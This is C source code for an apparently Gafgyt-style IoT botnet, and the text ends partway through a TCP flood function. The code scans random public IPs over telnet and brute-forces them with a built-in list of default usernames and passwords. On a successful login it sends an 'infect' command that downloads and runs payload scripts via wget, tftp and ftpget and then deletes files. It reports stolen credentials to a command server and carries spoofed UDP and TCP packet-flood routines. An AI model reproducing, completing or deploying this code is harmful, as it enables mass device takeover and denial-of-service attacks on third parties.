#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024 
struct telstate_t
{
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd;
        unsigned char passwordInd;
        unsigned char tempDirInd;
        unsigned int totalTimeout;
        unsigned short bufUsed;
        char *sockbuf;
};
unsigned char *commServer[] =
{
        "0.0.0.0"
};

char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;exit\r\n";

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);

int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
char *usernames[] = {"root\0", "support\0", "guest\0", "ubnt\0"};
char *passwords[] = {"root\0", "\0", "admin\0", "123\0", "1234\0", "12345\0", "123456\0", "support\0", "ubnt\0", "7ujMko0vizxv\0", "dreambox\0", "guest\0"};
char* tmpdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};
char* advances[] = {":", "ogin", "sername", "assword", (char*)0};
char* fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char* successes[] = {"busybox", "$", "#", (char*)0};
char* advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int contains_string(char* buffer, char** strings)
{
        int num_strings = 0, i = 0;

        for(num_strings = 0; strings[++num_strings] != 0; );

        for(i = 0; i < num_strings; i++)
        {
                if(strcasestr(buffer, strings[i]))
                {
                        return 1;
                }
        }

        return 0;
}
int contains_success(char* buffer)
{
        return contains_string(buffer, successes);
}

int contains_fail(char* buffer)
{
        return contains_string(buffer, fails);
}

int contains_response(char* buffer)
{
        return contains_success(buffer) || contains_fail(buffer);
}

int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;

        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);

        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
                return 0;

        return recv(fd, buffer, buf_size, 0);
}

int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

        if(buffer[0] == 0xFF)
        {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings))
        {
                return 1;
        }

        return 0;
}

const char* get_telstate_host(struct telstate_t* telstate)
{
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_state(struct telstate_t* telstate, int new_state)
{
        if(new_state == 0)
        {
                close(telstate->fd);
        }

        telstate->totalTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}

void reset_telstate(struct telstate_t* telstate)
{
        advance_state(telstate, 0);
        telstate->complete = 1;
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}

int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("bot: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr)
{
        char *prompts = ":>%$#\0";

        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++)
        {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
        int bufferUsed = initialIndex, got = 0, found = 0;
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = timeout;
        tv.tv_usec = timeoutusec;
        unsigned char *initialRead = NULL;

        while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
        {
                FD_ZERO(&myset);
                FD_SET(fd, &myset);
                if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
                initialRead = buffer + bufferUsed;
                got = recv(fd, initialRead, 1, 0);
                if(got == -1 || got == 0) return 0;
                bufferUsed += got;
                if(*initialRead == 0xFF)
                {
                        got = recv(fd, initialRead + 1, 2, 0);
                        if(got == -1 || got == 0) return 0;
                        bufferUsed += got;
                        if(!negotiate(fd, initialRead, 3)) return 0;
                } else {
                        if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                }
        }

        if(found) return 1;
        return 0;
}
in_addr_t getRandomPublicIP()
{
        uint8_t ipState[4] = {0};
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;

        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] >= 224)
        )
        {
                ipState[0] = rand() % 255;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }

        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}
in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd)
{
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
void StartTheLelz(int wait_usec, int maxfds)
{
        int max = getdtablesize() - 100, i, res, num_tmps, j;
        char buf[128], cur_dir;

        if (max > maxfds)
                max = maxfds;
        fd_set fdset;
        struct timeval tv;
        socklen_t lon;
        int valopt;

        char line[256];
        char* buffer;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        buffer = malloc(SOCKBUF_SIZE + 1);
        memset(buffer, 0, SOCKBUF_SIZE + 1);

        struct telstate_t fds[max];


        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++)
        {
                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                fds[i].complete = 1;
                fds[i].sockbuf = buffer;
        }
        for(num_tmps = 0; tmpdirs[++num_tmps] != 0; );



        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        if(fds[i].totalTimeout == 0)
                        {
                                fds[i].totalTimeout = time(NULL);
                        }

                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        if(fds[i].complete == 1)
                                        {
                                                // clear the current fd
                                                char *tmp = fds[i].sockbuf;
                                                memset(&(fds[i]), 0, sizeof(struct telstate_t));
                                                fds[i].sockbuf = tmp;
                                                // get a new random ip
                                                fds[i].ip = getRandomPublicIP();
                                        }
                                        else if(fds[i].complete == 0)
                                        {
                                                fds[i].passwordInd++;

                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *))
                                                {
                                                        fds[i].passwordInd = 0;
                                                        fds[i].usernameInd++;
                                                }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *))
                                                {
                                                        fds[i].complete = 1;
                                                        continue;
                                                }
                                        }

                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;

                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                                        if(fds[i].fd == -1) continue;

                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS)
                                        {
                                                reset_telstate(&fds[i]);
                                        }
                                        else
                                        {
                                                advance_state(&fds[i], 1);
                                        }
                                }
                                break;

																case 1:
																	{
																		FD_ZERO(&fdset);
																		FD_SET(fds[i].fd, &fdset);
																		tv.tv_sec = 0;
																		tv.tv_usec = wait_usec;
																		res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
													
																		if(res == 1)
																		{
																			lon = sizeof(int);
																			valopt = 0;
																			getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
																			//printf("%d\n",valopt);
																			if(valopt)
																			{
																				reset_telstate(&fds[i]);
																			}
																			else
																			{
																				fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
																				advance_state(&fds[i], 2);
																			}
																			continue;
																		}
																		else if(res == -1)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 2:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 3);
																			}
													
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 3:
																	{
																		if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		advance_state(&fds[i], 4);
																	}
																	break;
													
																case 4:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances))
																		{
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else
																			{
																				advance_state(&fds[i], 5);
																			}
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 6 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;
													
																case 5:
																	{
																		if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0)
																		{
																			reset_telstate(&fds[i]);
																			continue;
																		}
													
																		advance_state(&fds[i], 6);
																	}
																	break;
													
																case 6:
																	{
																		if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2))
																		{
																			fds[i].totalTimeout = 0;
													
																			if(contains_fail(fds[i].sockbuf))
																			{
																				advance_state(&fds[i], 0);
																			}
																			else if(contains_success(fds[i].sockbuf))
																			{
																				if(fds[i].complete == 2)
																				{
																					advance_state(&fds[i], 7);
																				}
																				else
																				{
																					sockprintf(mainCommSock, "Success telnet attempt - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
																					advance_state(&fds[i], 7);
																				}
																			}
																			else
																			{
																				reset_telstate(&fds[i]);
																			}
																			continue;
																		}
													
																		if(fds[i].totalTimeout + 7 < time(NULL))
																		{
																			reset_telstate(&fds[i]);
																		}
																	}
																	break;							
																case 7:
																	{
																		for(j = 0; j < num_tmps; j++)
																		{
																			memset(buf, 0, 128);
																			if(j == 0)
																				snprintf(buf, 127, ">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j], tmpdirs[j]);
																			else
																				snprintf(buf, 127, ">%s.t && cd %s ; >retrieve\r\n", tmpdirs[j], tmpdirs[j], tmpdirs[j]);
													
																			if(send(fds[i].fd, buf, strlen(buf), MSG_NOSIGNAL) < 0)
																			{
																				reset_telstate(&fds[i]);
																				continue;
																			}
																		}												
																		advance_state(&fds[i], 8);
																	}
                                  break;
                                  case 8:
								  {
                              fds[i].totalTimeout = 0;
                              if(send(fds[i].fd, infect, strlen(infect), MSG_NOSIGNAL) < 0)
                                  {
                                    sockprintf(mainCommSock, "Bot deploy success - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                    reset_telstate(&fds[i]);
                                    continue;
                                  }
                                      if(fds[i].totalTimeout + 10 < time(NULL))
                                      {
                                      	sockprintf(mainCommSock, "Bot deploy failed - %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                        reset_telstate(&fds[i]);
                                      }  
                                    break;
                                       }
                               }
                       }
                     }				
}		

			 
                            													
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
                      //  sockprintf(mainCommSock, "Failed opening raw socket.");
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
                        //sockprintf(mainCommSock, "Failed opening raw socket.");
                        //sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
                      //  sockprintf(mainCommSock, "Failed setting raw headers mode.");
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);

                        if(i == pollRegister)
                        {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                //sockprintf(mainCommSock, "Failed opening raw socket.");
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                //sockprintf(mainCommSock, "Failed setting raw headers mode.");
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
